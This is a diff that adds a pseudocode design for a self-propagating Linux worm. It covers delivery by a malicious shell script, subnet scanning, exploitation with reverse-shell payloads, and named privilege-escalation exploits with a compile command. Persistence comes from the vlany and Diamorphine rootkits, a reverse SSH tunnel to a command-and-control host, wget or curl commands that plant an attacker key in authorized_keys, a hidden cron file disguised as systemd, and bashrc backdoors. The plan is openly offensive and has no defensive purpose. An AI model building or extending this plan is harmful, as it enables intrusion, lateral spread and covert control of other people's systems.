@@ -1,0 +1,61 @@
+###########PSUEDOCODE############
+
+Linux:
+- File is compiled to .elf or .exe before delivery
+- Malicious shell script is executed and downloads WORM + dependencies
+- Worm is executed on victim pc
+- Worm analyzes current environment and resources
+    - Gets public and private IP
+    - Gets list of available hosts
+- Worm escalates privileges
+- Worm begins executing persistence
+- Worm executes spreading
+
+-----------SPREADING-------------
+1) Scans all hosts in current subnet for target ports
+2) Verify that host is vulnerable to an available exploit
+3) Fire exploit at vulnerable hosts with a reverse shell payload
+4) Pass shell to propagate class to escalate privileges (QUIETLY)
+5) Apply persistence
+6) Repeat 1-5 for all hosts
+
+-----------PRIV ESC-------------
+- Dirty Sock    - (Snap)
+- Full-Nelson   - Kernel 2.6.37 <= 'Full-Nelson.c' (RedHat/Ubuntu 10.04)
+- CVE-2010-3904 - Kernel <=2.6.36-rc8 (RDS protocol)
+- CVE-2016-5195 - Dirty Cow (LOUD! Last resort)
+    - https://dirtycow.ninja/
+    - Compile:  g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+
+--------Exploits----------
+- Libssh Authentication Bypass
+- Heartbleed (CVE-2014-0160)
+- Shellshock
+
+----------PERSISTENCE----------
+- Can we install vlany?
+    - Install vlany, with a hidden root user and ssh server
+    - Use vlany for everything persistence related
+    - break
+- Can we install Diamorphine?
+    - Install Diamorphine, create hidden directory
+    - Use Diamorphine for persistence
+    -break
+- Is there currently a SSH server?
+    - reverse ssh connection to host for communication
+        - ssh -Ntf -R 22:localhost:2222 myhost@myc2
+            - SSH key persistence:
+                - Do we have wget?
+                    - echo $(wget https://my_ip/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys
+                - Do we have curl?
+                    - echo $(curl https://my_ip/.ssh/id_rsa.pub -O id_rsa.pub >> ~/.ssh/authorized_keys
+                - Add to authorized hosts
+- Do we need to add a new user?
+- Is cron available?
+    - Create hidden crontab (/etc/cron.d/systemd-Zero)
+- Is systemd available?
+    - Create system service
+- Does the system use service?
+    - Infect a current running service
+- RC local?
+- Backdoor user's bashrc?
